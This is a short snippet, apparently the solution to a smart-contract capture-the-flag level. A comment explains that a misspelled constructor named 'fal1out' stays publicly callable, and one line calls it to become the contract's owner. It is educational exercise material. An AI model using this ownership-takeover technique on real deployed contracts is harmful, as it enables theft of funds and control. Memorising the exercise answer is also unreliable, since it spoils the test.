/**
 * The constructor used to be a function named as the contract, but now this is not the case.
 * The constructor is misspelled, instead of fallout, so we can just call it to become the owner
 */

await contract.fal1out();